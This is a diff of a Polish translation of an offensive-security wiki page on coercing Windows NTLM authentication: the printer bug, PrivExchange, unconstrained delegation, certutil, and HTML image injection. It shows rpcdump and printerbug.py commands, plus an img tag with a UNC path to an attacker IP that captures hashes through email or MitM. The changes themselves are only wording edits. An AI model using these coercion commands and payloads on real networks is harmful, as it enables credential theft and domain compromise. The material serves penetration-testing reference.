@@ -28,7 +28,7 @@ Możesz również użyć rpcdump.py na Linuxie i szukać protokołu MS-RPRN.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Poproś usługę o uwierzytelnienie przeciwko dowolnemu hoście
+### Poproś usługę o uwierzytelnienie się w stosunku do dowolnego hosta
 
 Możesz skompilować[ **SpoolSample stąd**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Łączenie z Nieograniczoną Delegacją
 
-Jeśli atakujący już skompromitował komputer z [Nieograniczoną Delegacją](unconstrained-delegation.md), atakujący może **sprawić, że drukarka uwierzytelni się w tym komputerze**. Z powodu nieograniczonej delegacji, **TGT** **konta komputera drukarki** będzie **zapisane w** **pamięci** komputera z nieograniczoną delegacją. Ponieważ atakujący już skompromitował ten host, będzie w stanie **odzyskać ten bilet** i go wykorzystać ([Pass the Ticket](pass-the-ticket.md)).
+Jeśli atakujący już skompromitował komputer z [Nieograniczoną Delegacją](unconstrained-delegation.md), atakujący może **sprawić, że drukarka uwierzytelni się w tym komputerze**. Z powodu nieograniczonej delegacji, **TGT** **konta komputera drukarki** będzie **zapisywane w** **pamięci** komputera z nieograniczoną delegacją. Ponieważ atakujący już skompromitował ten host, będzie w stanie **odzyskać ten bilet** i go nadużyć ([Pass the Ticket](pass-the-ticket.md)).
 
 ## Wymuszenie uwierzytelnienia RCP
 
@@ -51,9 +51,9 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-Atak `PrivExchange` jest wynikiem luki znalezionej w **funkcji `PushSubscription` serwera Exchange**. Funkcja ta pozwala serwerowi Exchange na wymuszenie przez dowolnego użytkownika domeny z skrzynką pocztową uwierzytelnienia do dowolnego hosta dostarczonego przez klienta za pośrednictwem HTTP.
+Atak `PrivExchange` jest wynikiem luki znalezionej w **funkcji `PushSubscription` serwera Exchange**. Funkcja ta pozwala serwerowi Exchange na wymuszenie uwierzytelnienia przez dowolnego użytkownika domeny z skrzynką pocztową do dowolnego hosta dostarczonego przez klienta za pośrednictwem HTTP.
 
-Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (konkretnie, ma **uprawnienia WriteDacl na domenie przed aktualizacją zbiorczą z 2019 roku**). Ta luka może być wykorzystana do umożliwienia **przekazywania informacji do LDAP i następnie wydobycia bazy danych NTDS domeny**. W przypadkach, gdy przekazywanie do LDAP nie jest możliwe, ta luka może być nadal używana do przekazywania i uwierzytelniania do innych hostów w obrębie domeny. Udane wykorzystanie tego ataku zapewnia natychmiastowy dostęp do administratora domeny z dowolnym uwierzytelnionym kontem użytkownika domeny.
+Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (konkretnie, ma **uprawnienia WriteDacl na domenie przed aktualizacją zbiorczą z 2019 roku**). Ta luka może być wykorzystana do umożliwienia **przekazywania informacji do LDAP i następnie wydobycia bazy danych NTDS domeny**. W przypadkach, gdy przekazywanie do LDAP nie jest możliwe, ta luka może być nadal używana do przekazywania i uwierzytelniania się w innych hostach w obrębie domeny. Udane wykorzystanie tego ataku zapewnia natychmiastowy dostęp do administratora domeny z dowolnym uwierzytelnionym kontem użytkownika domeny.
 
 ## Wewnątrz Windows
 
@@ -88,7 +88,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
 ## Wstrzykiwanie HTML
 
-### Przez e-mail
+### Poprzez e-mail
 
 Jeśli znasz **adres e-mail** użytkownika, który loguje się na maszynie, którą chcesz skompromitować, możesz po prostu wysłać mu **e-mail z obrazem 1x1** takim jak
 ```html
@@ -98,11 +98,12 @@ i gdy to otworzy, spróbuje się uwierzytelnić.
 
 ### MitM
 
-Jeśli możesz przeprowadzić atak MitM na komputer i wstrzyknąć HTML na stronie, którą będzie przeglądał, możesz spróbować wstrzyknąć obrazek taki jak poniższy na stronie:
+Jeśli możesz przeprowadzić atak MitM na komputer i wstrzyknąć HTML na stronie, którą będzie wizualizować, możesz spróbować wstrzyknąć obrazek taki jak poniższy na stronie:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Inne sposoby na wymuszenie i phishing autoryzacji NTLM
+## Inne sposoby na wymuszenie i phishing NTLM authentication
+
 
 {{#ref}}
 ../ntlm/places-to-steal-ntlm-creds.md
